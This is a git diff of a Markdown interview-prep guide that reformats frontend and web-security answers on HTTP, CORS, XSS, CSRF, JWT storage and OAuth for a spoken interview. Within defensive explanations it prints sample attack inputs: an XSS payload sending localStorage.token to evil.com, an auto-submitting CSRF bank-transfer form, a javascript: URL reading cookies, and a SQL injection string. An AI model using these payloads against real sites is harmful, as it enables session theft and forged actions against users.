@@ -58,169 +58,193 @@ Your resume says you led an audit that found 8 critical issues and cut findings 
 
 ## Part B — Interview Questions and Answers
 
+Every answer below has four parts: **Short answer** (say this first), **Explanation** (add if asked for more), **Example** (code or a real situation) and **Say it like this** (a sample spoken answer).
+
 ## 🟢 Level 1 — Web Basics
 
 **Q1. What happens when you type a URL and press Enter?**
 
-**Short answer:**
+**Short answer:** HSTS check, DNS lookup, TCP (or QUIC) and TLS handshakes, the HTTP request, the response, then parsing and rendering.
 
-1. The browser parses the URL and checks the HSTS list (whether this site must use HTTPS).
-2. **DNS lookup:** the browser cache, then the OS, then the resolver turns the hostname into an IP address.
-3. **TCP handshake** (or QUIC for HTTP/3).
-4. **TLS handshake:** the browser validates the certificate and agrees encryption keys.
-5. The **HTTP request** is sent with headers and cookies.
-6. The server or CDN responds, possibly with a redirect.
-7. The browser **parses the HTML**. The preload scanner discovers CSS, JavaScript and images, the DOM and CSSOM are built, scripts run, and then layout, paint and composite happen.
-8. Later requests reuse the open connection.
+**Explanation:** The browser parses HTML into the DOM, the preload scanner fetches sub-resources, then style, layout, paint and composite run. Later requests reuse the connection.
 
-**Say it like this:** "DNS turns the name into an IP, then TCP and TLS set up a secure connection, and the HTTP request goes out. The response HTML is parsed into the DOM, sub-resources are fetched in parallel, and the browser runs the rendering pipeline: style, layout, paint and composite. I can go deeper on any step. For performance, TLS and render-blocking resources are the interesting parts."
+**Example:** `app.bpobox.com` → DNS resolves to the CDN → TLS validates the certificate → GET `/` with cookies → HTML arrives → CSS and JS download in parallel → first paint.
+
+**Say it like this:** "DNS turns the name into an IP, TCP and TLS set up a secure connection, the request goes out, and the browser parses and renders the response. I can go deeper on any step."
 
 ---
 
 **Q2. HTTP vs HTTPS?**
 
-**Short answer:** HTTPS is HTTP over TLS. It gives **encryption** (nobody can read the traffic), **integrity** (nobody can change it) and **server authentication** (you're really talking to that site). It's required for service workers, camera and microphone access, HTTP/2 in browsers, and `Secure` cookies.
+**Short answer:** HTTPS is HTTP over TLS, giving encryption, integrity and server authentication.
+
+**Explanation:** It's required for service workers, camera and mic access, HTTP/2 in browsers and `Secure` cookies.
+
+**Example:** On public clinic Wi-Fi, HTTPS stops anyone on the network reading or altering patient data in transit.
+
+**Say it like this:** "HTTPS means nobody can read or tamper with traffic, and that you're talking to the real server; it's mandatory for anything modern."
 
 ---
 
 **Q3. What are the HTTP methods?**
 
-| Method | Purpose | Safe? | Idempotent? |
-|---|---|---|---|
-| GET | read | yes | yes |
-| POST | create or perform an action | no | no |
-| PUT | replace a resource | no | yes |
-| PATCH | partially update a resource | no | not guaranteed |
-| DELETE | delete | no | yes |
-| OPTIONS | CORS preflight | yes | yes |
-| HEAD | headers only | yes | yes |
+**Short answer:** GET (read), POST (create/action), PUT (replace), PATCH (partial update), DELETE, OPTIONS (CORS preflight) and HEAD.
 
-**Explanation:** *Idempotent* means doing it twice has the same effect as doing it once. That matters for retries. Retrying a PUT is safe, but retrying a POST could create duplicates unless you send an idempotency key.
+**Explanation:** GET, PUT and DELETE are idempotent, so retries are safe; POST isn't, so retries need an idempotency key.
+
+**Example:** `PUT /scorecards/42` twice leaves the same result; `POST /scorecards` twice creates two unless deduplicated.
+
+**Say it like this:** "Idempotency decides what's safe to retry, which matters for unreliable networks."
 
 ---
 
 **Q4. Which status codes should you know?**
 
-**Short answer:**
+**Short answer:** 2xx success (200, 201, 204), 3xx redirects (301/308, 302/307, 304), 4xx client errors (400, 401, 403, 404, 409, 422, 429) and 5xx server errors (500, 502, 503, 504).
 
-- **2xx success:** 200 OK, 201 Created, 204 No Content.
-- **3xx redirects:** 301/308 permanent, 302/307 temporary, 304 Not Modified (use the cached copy).
-- **4xx client errors:** 400 Bad Request, 401 Unauthenticated, 403 Forbidden, 404 Not Found, 409 Conflict, 422 Validation Error, 429 Too Many Requests.
-- **5xx server errors:** 500 Internal Error, 502 Bad Gateway, 503 Unavailable, 504 Gateway Timeout.
+**Explanation:** The UI should react differently: 401 refresh or log in, 403 show "no access", 409 offer a merge, 429 back off.
+
+**Example:** A 429 with `Retry-After: 5` makes the client wait five seconds before retrying.
+
+**Say it like this:** "Status codes drive UI behaviour, so my API client maps each class to a specific reaction."
 
 ---
 
 **Q5. 401 vs 403?**
 
-**Short answer:** 401 means "who are you?": the credentials are missing or invalid, so log in again. 403 means "I know who you are, but you're not allowed": logging in again won't help.
+**Short answer:** 401 means "who are you?" (not authenticated); 403 means "you're not allowed" (authenticated but forbidden).
 
-**Example:** An expired token gets a 401, so the frontend refreshes the token. A QA agent opening the admin page gets a 403, so the frontend shows "You don't have access".
+**Explanation:** Re-logging in fixes a 401, never a 403.
+
+**Example:** An expired token gets 401 → refresh; a QA agent opening the admin page gets 403 → "You don't have access".
+
+**Say it like this:** "401 is an identity problem, 403 a permission problem, and the UI handles them differently."
 
 ---
 
 **Q6. Which headers should you know?**
 
-**Short answer:**
+**Short answer:** Request: `Authorization`, `Cookie`, `Content-Type`, `Accept`, `Origin`, `If-None-Match`. Response: `Set-Cookie`, `Cache-Control`, `ETag`, `Content-Security-Policy`, `Strict-Transport-Security`, `Access-Control-Allow-Origin`, `Retry-After`.
 
-- **Request:** `Authorization`, `Cookie`, `Content-Type`, `Accept`, `Origin`, `If-None-Match`.
-- **Response:** `Set-Cookie`, `Cache-Control`, `ETag`, `Content-Security-Policy`, `Strict-Transport-Security`, `Access-Control-Allow-Origin`, `Retry-After`.
+**Explanation:** Many security and caching behaviours are controlled purely by headers.
+
+**Example:** `ETag` plus `If-None-Match` lets the server reply `304 Not Modified` with no body.
+
+**Say it like this:** "Headers control auth, caching and security policy, so I treat them as part of the frontend's contract."
 
 ---
 
 **Q7. What are the cookie attributes?**
 
-**Short answer:**
+**Short answer:** `HttpOnly`, `Secure`, `SameSite`, `Domain`, `Path`, `Expires`/`Max-Age`, and prefixes like `__Host-`.
 
-| Attribute | Meaning |
-|---|---|
-| `HttpOnly` | JavaScript can't read it, which protects it from XSS theft |
-| `Secure` | sent only over HTTPS |
-| `SameSite=Strict` | never sent on cross-site requests |
-| `SameSite=Lax` | sent on top-level navigation (clicking a link), not on cross-site POSTs or iframes |
-| `SameSite=None` | always sent (requires `Secure`); needed for legitimate cross-site use |
-| `Domain`, `Path` | which URLs receive it |
-| `Expires` / `Max-Age` | lifetime |
-| `__Host-` prefix | forces `Secure`, no `Domain`, `Path=/`, which is the most locked-down option |
+**Explanation:** `HttpOnly` blocks JavaScript access, `Secure` requires HTTPS, `SameSite` controls cross-site sending, and `__Host-` forces the most locked-down settings.
 
 **Example:** `Set-Cookie: __Host-session=abc; Path=/; Secure; HttpOnly; SameSite=Lax`
+
+**Say it like this:** "Session cookies are always HttpOnly, Secure and SameSite, ideally with the `__Host-` prefix."
 
 ---
 
 **Q8. What is the same-origin policy?**
 
-**Short answer:** A page can **read** responses only from the same scheme, host and port. Cross-origin requests may still be *sent* (forms, images, scripts), but the response can't be read by JavaScript. This stops `evil.com` from reading your bank balance with `fetch`.
+**Short answer:** A page can read responses only from the same scheme, host and port.
+
+**Explanation:** Cross-origin requests may still be sent (forms, images), but their responses can't be read by JavaScript.
+
+**Example:** JavaScript on `evil.com` can't `fetch` your bank page and read your balance.
+
+**Say it like this:** "Same-origin stops other sites reading your data, which is the foundation of browser security."
 
 ---
 
 **Q9. What is CORS?**
 
-**Short answer:** Cross-Origin Resource Sharing is how a server opts in to letting other origins read its responses.
+**Short answer:** Cross-Origin Resource Sharing: a server opts in to letting specific other origins read its responses.
 
-- The browser sends an `Origin` header, and the server replies with `Access-Control-Allow-Origin`.
-- "Non-simple" requests trigger a **preflight** `OPTIONS` request first. These include requests with custom headers, a JSON content type, or methods like PUT and DELETE.
-- With cookies (`credentials: 'include'`), the server must return an *explicit* origin (not `*`) and `Access-Control-Allow-Credentials: true`.
+**Explanation:** Non-simple requests trigger a preflight OPTIONS request. With cookies, the server must return an explicit origin and `Access-Control-Allow-Credentials: true`.
+
+**Example:**
 
 ```text
-Browser → OPTIONS /api/calls   Origin: https://app.bpobox.com
-Server  ← Access-Control-Allow-Origin: https://app.bpobox.com
-          Access-Control-Allow-Methods: GET, POST
-          Access-Control-Allow-Headers: Content-Type
-          Access-Control-Allow-Credentials: true
-Browser → POST /api/calls (actual request)
+OPTIONS /api/calls   Origin: https://app.bpobox.com
+← Access-Control-Allow-Origin: https://app.bpobox.com
+← Access-Control-Allow-Credentials: true
 ```
+
+**Say it like this:** "CORS is the server telling the browser which other origins may read its responses."
 
 ---
 
 **Q10. Is CORS a security feature for your API?**
 
-**Short answer:** No. CORS protects *users' browsers* from other sites reading responses. It doesn't protect your API at all from curl, Postman or scripts. You still need authentication and authorisation on every endpoint.
+**Short answer:** No. It protects users' browsers, not your API; curl and scripts ignore it.
 
-**Say it like this:** "CORS is a browser rule, not an API firewall. I've seen teams think a strict CORS config secures their API. It doesn't: anyone can call the API outside a browser."
+**Explanation:** Every endpoint still needs authentication and authorisation.
+
+**Example:** A strict CORS policy doesn't stop `curl -H "Cookie: …" https://api/…` at all.
+
+**Say it like this:** "CORS is a browser rule, not an API firewall."
 
 ---
 
 **Q11. What are the REST principles?**
 
-**Short answer:** Resources identified by URLs (`/calls/42`), standard HTTP methods, stateless requests, JSON representations, correct status codes and cacheable responses.
+**Short answer:** Resource URLs, standard methods, stateless requests, JSON representations, correct status codes and cacheability.
+
+**Explanation:** Following them makes APIs predictable and lets HTTP caching work.
+
+**Example:** `GET /calls/42`, `PATCH /calls/42`, `DELETE /calls/42`, with 200, 204 and 404 as appropriate.
+
+**Say it like this:** "REST is about predictable resources and verbs, which makes clients simple."
 
 ---
 
 **Q12. REST vs GraphQL vs gRPC?**
 
-| | REST | GraphQL | gRPC |
-|---|---|---|---|
-| Endpoints | many | one | service methods |
-| Data shape | server decides | client selects fields | protobuf contract |
-| Over- and under-fetching | common | avoided | n/a |
-| HTTP caching | easy | harder (POST) | n/a |
-| Browser support | native | native | needs gRPC-Web |
-| Best for | most public APIs | flexible UIs aggregating many sources | fast service-to-service calls |
+**Short answer:** REST is simple with HTTP caching; GraphQL lets clients pick fields from one endpoint; gRPC is fast binary service-to-service.
+
+**Explanation:** GraphQL avoids over- and under-fetching but needs query limits and different caching; gRPC needs gRPC-Web for browsers.
+
+**Example:** The airline site used GraphQL to fetch exactly the fields each widget needed from many services.
+
+**Say it like this:** "REST by default, GraphQL when UIs aggregate many sources, gRPC between services."
 
 ---
 
 **Q13. What are the options for real-time communication?**
 
-**Short answer:**
+**Short answer:** Short polling, long polling, SSE, WebSocket and WebRTC.
 
-- **Short polling:** ask every N seconds.
-- **Long polling:** the server holds the request open until there's data.
-- **SSE** (Server-Sent Events): a one-way server-to-client stream over HTTP, with auto-reconnect.
-- **WebSocket:** bidirectional and persistent.
-- **WebRTC:** peer-to-peer or SFU media and data over UDP, with the lowest latency.
+**Explanation:** Choose by direction, frequency, latency and infrastructure.
+
+**Example:** Notifications via SSE, chat via WebSocket, video via WebRTC.
+
+**Say it like this:** "I pick the simplest transport that fits the direction and latency the feature needs."
 
 ---
 
 **Q14. SSE vs WebSocket: when do you use each?**
 
-**Short answer:** Use **SSE** for one-way streams: notifications, LLM tokens, job progress. It's simple, works over normal HTTP and proxies, and reconnects automatically. Use **WebSocket** for two-way interactive features: chat with typing indicators, collaborative editing, games.
+**Short answer:** SSE for one-way server-to-client streams; WebSocket for two-way interactive features.
 
-**Say it like this:** "For the AI compliance chat I used SSE. The server streams tokens one way, and the user's question goes as a normal POST. WebSocket would add connection management for no benefit."
+**Explanation:** SSE works over normal HTTP and reconnects automatically; WebSocket needs connection management.
+
+**Example:** The AI compliance chat streams tokens over SSE; the question is a normal POST.
+
+**Say it like this:** "For the compliance chat SSE was enough: tokens flow one way, and WebSocket would add complexity for nothing."
 
 ---
 
 **Q15. Authentication vs authorisation?**
 
-**Short answer:** Authentication verifies *who you are* (login). Authorisation decides *what you can do* (permissions).
+**Short answer:** Authentication verifies who you are; authorisation decides what you can do.
+
+**Explanation:** Both are needed on every request: a valid user can still be unauthorised for a resource.
+
+**Example:** Logged in as a QA reviewer (authenticated) but blocked from tenant settings (not authorised).
+
+**Say it like this:** "AuthN is identity, AuthZ is permission, and the server checks both every time."
 
 ---
 
@@ -228,159 +252,171 @@ Browser → POST /api/calls (actual request)
 
 **Q16. What is XSS, what types are there, and what's the impact?**
 
-**Short answer:** Cross-Site Scripting means an attacker gets their JavaScript to run inside your trusted page. There are three types:
+**Short answer:** Attacker JavaScript running in your page: stored, reflected or DOM-based.
 
-- **Stored:** the payload is saved in the database (for example, a comment) and served to every viewer.
-- **Reflected:** the payload comes from the URL or request and is echoed back.
-- **DOM-based:** client-side JavaScript writes untrusted data into a dangerous sink (`innerHTML`).
+**Explanation:** The script can do anything the user can: read data on screen, call APIs, log keystrokes and steal non-HttpOnly tokens.
 
-**Impact:** the script can do anything the user can. It can read the data on screen, call APIs as the user, log keystrokes, and steal tokens that aren't in HttpOnly cookies.
-
-**Example payload:**
+**Example:**
 
 ```html
 <img src=x onerror="fetch('https://evil.com?c='+localStorage.token)">
 ```
 
+**Say it like this:** "XSS means the attacker's code runs as the user, so it's one of the most serious frontend bugs."
+
 ---
 
 **Q17. How do you defend against XSS?**
 
-**Short answer:** Use several layers:
+**Short answer:** Escape output by default, avoid dangerous sinks, sanitise required HTML, add a CSP and Trusted Types, keep tokens in HttpOnly cookies, and validate URLs.
 
-1. **Encode output by default.** React escapes text automatically.
-2. **Avoid dangerous sinks:** `innerHTML`, `dangerouslySetInnerHTML`, `eval`, `new Function`, `setTimeout('string')`, `javascript:` URLs.
-3. **Sanitise** when you genuinely need HTML, with DOMPurify.
-4. Add a **Content Security Policy** with nonces or hashes.
-5. Use **Trusted Types** to lock down DOM sinks.
-6. Keep session tokens in **HttpOnly cookies**, out of JavaScript's reach.
-7. **Validate URLs:** `new URL(x)`, and allow only the `https:` and `http:` protocols.
+**Explanation:** Defence in depth: if one layer fails, CSP stops injected scripts running or sending data out.
+
+**Example:**
 
 ```tsx
-import DOMPurify from 'dompurify';
 <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
-
-const safeHref = (u: string) => {
-  try { const url = new URL(u); return ['https:', 'http:'].includes(url.protocol) ? u : '#'; }
-  catch { return '#'; }
-};
+const safeHref = (u: string) => { try { return ['https:', 'http:'].includes(new URL(u).protocol) ? u : '#'; } catch { return '#'; } };
 ```
 
-**Say it like this:** "React escapes text by default, so my XSS checklist focuses on escape hatches: `dangerouslySetInnerHTML`, user-supplied URLs and markdown rendering. Behind that, a strict CSP means even an injected script can't run or talk to an attacker's server."
+**Say it like this:** "React escapes text, so I focus on escape hatches, and a strict CSP is the safety net."
 
 ---
 
 **Q18. Where can XSS still happen in React?**
 
-**Short answer:**
+**Short answer:** `dangerouslySetInnerHTML`, `javascript:` URLs in `href`, unsanitised markdown or LLM output, `innerHTML` via refs, third-party widgets, and unescaped JSON in `<script>` tags.
 
-- `dangerouslySetInnerHTML` with unsanitised content.
-- `href={userUrl}` containing `javascript:alert(1)`.
-- Rendering markdown or LLM output to HTML without sanitising it.
-- `ref.current.innerHTML = …`.
-- Third-party widgets.
-- Server-injected JSON in a `<script>` tag without escaping `</script>`.
+**Explanation:** Each bypasses React's automatic escaping.
+
+**Example:** `<a href={user.website}>` with `javascript:alert(document.cookie)` runs on click.
+
+**Say it like this:** "I audit every escape hatch, especially links and rendered markdown."
 
 ---
 
 **Q19. What is CSRF, and how do you defend against it?**
 
-**Short answer:** Cross-Site Request Forgery: a malicious site makes the victim's browser send an authenticated request to *your* app. It works because the browser attaches your cookies automatically.
+**Short answer:** Another site makes the user's browser send an authenticated request, because cookies are attached automatically.
+
+**Explanation:** Defend with SameSite cookies, CSRF tokens, Origin checks, no state changes on GET, and re-authentication for sensitive actions.
+
+**Example:**
 
 ```html
-<!-- on evil.com -->
-<form action="https://bank.com/transfer" method="POST">
-  <input name="to" value="attacker"><input name="amount" value="10000">
-</form>
+<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"></form>
 <script>document.forms[0].submit()</script>
 ```
 
-**Defences:**
-
-- `SameSite=Lax` or `Strict` cookies.
-- CSRF tokens (the synchroniser or double-submit pattern).
-- Verify the `Origin` or `Referer` header on state-changing requests.
-- Never change state on a GET.
-- Re-authenticate for sensitive actions.
+**Say it like this:** "CSRF abuses automatic cookies, so SameSite cookies plus Origin or token checks shut it down."
 
 ---
 
 **Q20. Does putting a JWT in the Authorization header prevent CSRF?**
 
-**Short answer:** Yes. Browsers don't attach headers automatically on cross-site requests. But the token must then be readable by JavaScript, so a single XSS can steal it. You've traded CSRF risk for XSS risk.
+**Short answer:** Yes, because headers aren't attached automatically, but the token must then be readable by JavaScript.
+
+**Explanation:** You've traded CSRF risk for XSS token-theft risk.
+
+**Example:** One XSS bug can read the token from memory or storage and use it from anywhere.
+
+**Say it like this:** "Bearer headers solve CSRF but make XSS worse; there's no free lunch."
 
 ---
 
 **Q21. What is clickjacking?**
 
-**Short answer:** An attacker loads your page in an invisible iframe and tricks users into clicking buttons on it, for example "Delete account" hidden under "Win a prize". Defend with `Content-Security-Policy: frame-ancestors 'none'`, or allow only specific origins. `X-Frame-Options: DENY` is the legacy equivalent.
+**Short answer:** Your page is loaded in an invisible iframe to trick users into clicking it.
+
+**Explanation:** Prevent it with `frame-ancestors 'none'` in CSP (or `X-Frame-Options: DENY`).
+
+**Example:** A hidden "Delete account" button under a fake "Win a prize" button.
+
+**Say it like this:** "`frame-ancestors` stops other sites framing our app, which kills clickjacking."
 
 ---
 
 **Q22. What is an open redirect?**
 
-**Short answer:** `/login?next=https://evil.com` sends users to an attacker's site after they log in, and the trusted domain makes the phishing link look legitimate. Allow only relative paths or an allowlist of destinations.
+**Short answer:** A redirect parameter that sends users to an attacker's site after login.
+
+**Explanation:** The trusted domain makes phishing links believable. Allow only relative paths or an allowlist.
+
+**Example:**
 
 ```ts
 const next = searchParams.get('next') ?? '/';
 const safe = next.startsWith('/') && !next.startsWith('//') ? next : '/';
 ```
 
+**Say it like this:** "Redirect targets are validated so our domain can't be used to launch phishing."
+
 ---
 
 **Q23. What is IDOR, or broken access control?**
 
-**Short answer:** Insecure Direct Object Reference: changing an ID in a request (`/api/calls/124` → `/api/calls/125`) returns someone else's data, because the server never checked ownership or tenant. Broken access control is the **number one** category in the OWASP Top 10.
+**Short answer:** Changing an ID in a request returns someone else's data because the server didn't check ownership or tenant.
 
-**Defence:** authorise *every* request on the server, checking the user, their tenant and their ownership of the resource. Back it with automated tests.
+**Explanation:** It's the top OWASP category. Authorise every request by user, tenant and ownership, with automated tests.
 
-**Say it like this:** "IDOR is the most common serious bug I look for. The frontend might never show call 125's link, but the API must still reject it. In our audit, missing tenant scoping was exactly this kind of issue."
+**Example:** `/api/calls/124` → `/api/calls/125` returns another team's recording.
+
+**Say it like this:** "The UI may never show call 125's link, but the API must still reject it; missing tenant scoping was exactly this kind of finding in our audit."
 
 ---
 
 **Q24. What is injection (SQL, NoSQL, command)?**
 
-**Short answer:** Untrusted input interpreted as code. Defend with parameterised queries or an ORM, input validation, and least-privilege database users. Frontend validation is UX only, never security.
+**Short answer:** Untrusted input interpreted as code.
+
+**Explanation:** Use parameterised queries or ORMs, validation and least-privilege DB users. Frontend validation is UX only.
+
+**Example:** `WHERE name = '${input}'` with `' OR 1=1 --` returns every row; a parameterised query doesn't.
+
+**Say it like this:** "Input is always data, never code: parameterised queries, validated on the server."
 
 ---
 
 **Q25. How does sensitive data get exposed by the frontend?**
 
-**Short answer:**
+**Short answer:** Secrets in bundles, verbose errors, data in URLs, sensitive data in localStorage, and public source maps.
 
-- Secrets in bundles (API keys in `NEXT_PUBLIC_` or `VITE_` variables).
-- Verbose error messages.
-- Data in URLs, which ends up in server logs, proxies and analytics.
-- Sensitive data in localStorage.
-- Public source maps revealing internal code.
+**Explanation:** Anything shipped to the browser is public.
+
+**Example:** An API key in `NEXT_PUBLIC_API_KEY` is visible to anyone opening DevTools.
+
+**Say it like this:** "I assume everything in the bundle, URL and storage is public, and design around that."
 
 ---
 
 **Q26. What's on the security headers checklist?**
 
+**Short answer:** CSP, HSTS, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy` and COOP.
+
+**Explanation:** Each closes a specific class of attack with one header.
+
+**Example:**
+
 ```text
-Content-Security-Policy: …
 Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 X-Content-Type-Options: nosniff
 Referrer-Policy: strict-origin-when-cross-origin
 Permissions-Policy: camera=(self), microphone=(self), geolocation=()
-Cross-Origin-Opener-Policy: same-origin
 ```
 
-**Short answer:** CSP blocks injected scripts. HSTS forces HTTPS. `nosniff` stops the browser guessing MIME types. `Referrer-Policy` limits URL leakage. `Permissions-Policy` limits device APIs. COOP isolates your window from cross-origin popups.
+**Say it like this:** "A handful of headers give a lot of protection, so they're part of every deploy."
 
 ---
 
 **Q27. How do you protect against supply-chain attacks?**
 
-**Short answer:**
+**Short answer:** Lockfiles with `npm ci`, dependency bots and audits, reviewing new packages, pinning critical ones, SRI for CDN scripts and few third-party scripts.
 
-- Commit lockfiles and install with `npm ci`.
-- Use Dependabot or Renovate, and `npm audit` or Snyk.
-- Review new dependencies: maintainers, size, install scripts.
-- Pin critical packages.
-- Use Subresource Integrity for CDN scripts.
-- Keep third-party scripts to a minimum on sensitive pages.
+**Explanation:** Dependencies run with your app's full privileges.
+
+**Example:** A new dependency with a postinstall script and one maintainer gets reviewed before adding.
+
+**Say it like this:** "Every dependency is code we ship, so new ones get reviewed and all are scanned."
 
 ---
 
@@ -388,142 +424,187 @@ Cross-Origin-Opener-Policy: same-origin
 
 **Q28. Session cookies vs tokens (JWT)?**
 
-**Short answer:** With **sessions**, the server stores the session and the browser holds only an opaque ID in an HttpOnly cookie, so revocation is easy: delete the session. A **JWT** is self-contained, signed data. It can be verified without a database lookup, but it's hard to revoke before it expires, and it's larger. Many systems combine them: short-lived JWT access tokens plus server-tracked refresh tokens.
+**Short answer:** Sessions store state on the server with an opaque cookie and are easy to revoke; JWTs are self-contained and stateless but hard to revoke.
+
+**Explanation:** Many systems combine short-lived JWT access tokens with server-tracked refresh tokens.
+
+**Example:** Logging out a stolen session is one DB delete with sessions; with a 1-hour JWT it stays valid until expiry.
+
+**Say it like this:** "Sessions win on revocation, JWTs on statelessness; short-lived JWTs plus revocable refresh tokens balance both."
 
 ---
 
 **Q29. What is the structure of a JWT, and how do you validate it?**
 
-**Short answer:** A JWT is `header.payload.signature`, base64url-encoded. It's **signed, not encrypted**: anyone can decode and read the payload. To validate one:
+**Short answer:** `header.payload.signature`, base64url-encoded; signed, not encrypted.
 
-- Check the signature with the *expected* algorithm. Reject `alg: none`, and never let the token choose the algorithm.
-- Check `exp` (expiry), `nbf` (not before), `iss` (issuer) and `aud` (audience).
-- Keep the payload minimal, with **no PHI**.
+**Explanation:** Validate the signature with the expected algorithm (reject `none`), plus `exp`, `nbf`, `iss` and `aud`. Keep the payload minimal, with no PHI.
+
+**Example:**
 
 ```text
-eyJhbGciOiJSUzI1NiJ9 . eyJzdWIiOiJ1XzEyMyIsInJvbGUiOiJxYSIsImV4cCI6MTczMDAwMDAwMH0 . <signature>
-{ "alg": "RS256" }     { "sub": "u_123", "role": "qa", "exp": 1730000000 }
+{ "alg": "RS256" } . { "sub": "u_123", "role": "qa", "exp": 1730000000 } . <signature>
 ```
+
+**Say it like this:** "Anyone can read a JWT, so it never contains sensitive data, and the server validates algorithm, expiry, issuer and audience."
 
 ---
 
 **Q30. Where should tokens be stored in a browser?**
 
-| Option | If XSS happens | CSRF exposure | Notes |
-|---|---|---|---|
-| localStorage / sessionStorage | token can be **stolen** and used anywhere | none | avoid for sensitive apps |
-| HttpOnly Secure cookie | can't be read; XSS can still make requests while the page is open | needs SameSite + CSRF defence | strong default |
-| Memory (JS variable) + HttpOnly refresh cookie | lost on reload, re-fetched through refresh | refresh endpoint needs CSRF protection | common SPA pattern |
-| **BFF** (backend-for-frontend holds tokens) | browser only has a session cookie | SameSite + CSRF | **best for healthcare** |
+**Short answer:** Not in localStorage; prefer HttpOnly cookies, memory plus an HttpOnly refresh cookie, or a BFF holding tokens.
 
-**Say it like this:** "In a healthcare app I'd avoid localStorage completely, because one XSS bug means every token can be exfiltrated. My preference is a BFF: the server holds the OAuth tokens and the browser only has an HttpOnly, Secure, SameSite session cookie. If XSS happens, the attacker can't take the session away and replay it later."
+**Explanation:**
+
+| Option | If XSS happens | CSRF exposure |
+|---|---|---|
+| localStorage | token stolen | none |
+| HttpOnly cookie | can't be read | needs SameSite/CSRF defence |
+| Memory + refresh cookie | lost on reload | refresh endpoint needs CSRF defence |
+| BFF | browser has only a session cookie | SameSite/CSRF defence |
+
+**Example:** InterpretIQ moved from localStorage JWTs to HttpOnly, Secure, SameSite cookies after the audit.
+
+**Say it like this:** "For healthcare I'd use a BFF, so the browser only holds an HttpOnly session cookie and XSS can't take the session away."
 
 ---
 
 **Q31. What is refresh token rotation?**
 
-**Short answer:** Every refresh returns a *new* refresh token and invalidates the old one. If an old refresh token is ever used again, the server knows it was stolen and revokes the whole token family, logging out both the thief and the victim.
+**Short answer:** Each refresh issues a new refresh token and invalidates the old one; reuse of an old token revokes the whole family.
+
+**Explanation:** It turns token theft into a detectable event.
+
+**Example:** An attacker replays a stolen refresh token after the user already used it → server sees reuse → logs out both.
+
+**Say it like this:** "Rotation makes a stolen refresh token single-use and detectable."
 
 ---
 
 **Q32. How do you handle token expiry when several requests run at once?**
 
+**Short answer:** Make the refresh single-flight: the first 401 starts it, others wait on the same promise, each request retries once, and failure logs out.
+
+**Explanation:** Parallel refreshes can invalidate each other under rotation.
+
+**Example:**
+
 ```ts
 let refreshing: Promise<void> | null = null;
-
-export async function authFetch(input: RequestInfo, init: RequestInit = {}): Promise<Response> {
+export async function authFetch(input: RequestInfo, init: RequestInit = {}) {
   const run = () => fetch(input, { ...init, credentials: 'include' });
-  let res = await run();
+  const res = await run();
   if (res.status !== 401) return res;
-
   refreshing ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
     .then((r) => { if (!r.ok) throw new Error('refresh failed'); })
     .finally(() => { refreshing = null; });
-
-  try {
-    await refreshing;           // everyone waits on the SAME refresh
-  } catch {
-    logout();
-    throw new Error('Session expired');
-  }
-  return run();                 // retry once
+  try { await refreshing; } catch { logout(); throw new Error('Session expired'); }
+  return run();
 }
 ```
 
-**Short answer:** Make the refresh **single-flight**. The first 401 starts one refresh, and all other failed requests wait for that same promise. Retry each request once, and log out if the refresh fails.
+**Say it like this:** "One refresh for everyone, one retry per request, and logout if it fails."
 
 ---
 
 **Q33. What are the OAuth 2.0 roles and flows?**
 
-**Short answer:**
+**Short answer:** Roles: resource owner, client, authorisation server, resource server. Flows: Authorization Code + PKCE, Client Credentials and Device Code.
 
-- **Roles:** the resource owner (the user), the client (your app), the authorisation server (the identity provider) and the resource server (the API).
-- **Flows:**
-  - **Authorization Code + PKCE:** SPAs, mobile apps and server apps.
-  - **Client Credentials:** service-to-service.
-  - **Device Code:** TVs and CLIs.
-  - The Implicit and Password grants are **deprecated**.
+**Explanation:** Implicit and Password grants are deprecated.
+
+**Example:** A SPA logging in with Okta uses Authorization Code + PKCE; a backend job calling an API uses Client Credentials.
+
+**Say it like this:** "For browser apps it's always Authorization Code with PKCE."
 
 ---
 
 **Q34. How does PKCE work?**
 
-**Short answer:** Proof Key for Code Exchange:
+**Short answer:** The client sends a hash of a random verifier with the login request and must present the original verifier to exchange the code.
 
-1. The client creates a random `code_verifier` and sends `code_challenge = SHA256(code_verifier)` with the login request.
-2. The identity provider returns an authorisation code.
-3. To exchange the code for tokens, the client must send the original `code_verifier`.
+**Explanation:** A stolen authorisation code is useless without the verifier.
 
-A stolen authorisation code is useless without the verifier, which never left the app.
+**Example:**
+
+```text
+code_verifier = random 64 chars
+code_challenge = BASE64URL(SHA256(code_verifier))
+```
+
+**Say it like this:** "PKCE binds the code to the app that started the login, so intercepted codes can't be redeemed."
 
 ---
 
 **Q35. OIDC vs OAuth?**
 
-**Short answer:** OAuth is about **delegated authorisation**: access tokens for calling APIs. OIDC (OpenID Connect) adds an **identity layer** on top: an ID token with user claims, a `/userinfo` endpoint, and discovery. Always validate `state` (against CSRF), `nonce` (against replay) and the ID token's claims.
+**Short answer:** OAuth is delegated authorisation (access tokens); OIDC adds identity (ID tokens, `/userinfo`, discovery).
+
+**Explanation:** Validate `state` against CSRF, `nonce` against replay, and the ID token's claims.
+
+**Example:** "Sign in with Google" uses OIDC to know who the user is; calling Google Calendar uses the OAuth access token.
+
+**Say it like this:** "OAuth answers 'what can this app access', OIDC answers 'who is this user'."
 
 ---
 
 **Q36. What are SSO and SAML?**
 
-**Short answer:** Single Sign-On lets users log in once and access many apps through an identity provider (Okta, Azure AD). SAML is the older XML-based enterprise protocol, and OIDC is the modern JSON/JWT-based one.
+**Short answer:** SSO lets users log in once across apps via an identity provider; SAML is the older XML protocol and OIDC the modern JSON one.
+
+**Explanation:** Enterprises often require SAML; new integrations usually prefer OIDC.
+
+**Example:** A hospital's staff log into InterpretIQ through their Azure AD SSO.
+
+**Say it like this:** "Enterprise customers expect SSO; I'd support OIDC and SAML through an identity provider rather than building it."
 
 ---
 
 **Q37. RBAC vs ABAC vs ReBAC?**
 
-**Short answer:**
+**Short answer:** RBAC uses roles, ABAC uses attributes, ReBAC uses relationships.
 
-- **RBAC** (role-based): permissions come from roles: admin, QA, agent.
-- **ABAC** (attribute-based): policies on attributes, for example "same tenant AND same department AND during working hours".
-- **ReBAC** (relationship-based): based on relationships, for example "the user is a member of the team that owns this call".
+**Explanation:** Real systems combine RBAC with tenant and ownership checks.
 
-Real systems combine RBAC with tenant and ownership checks.
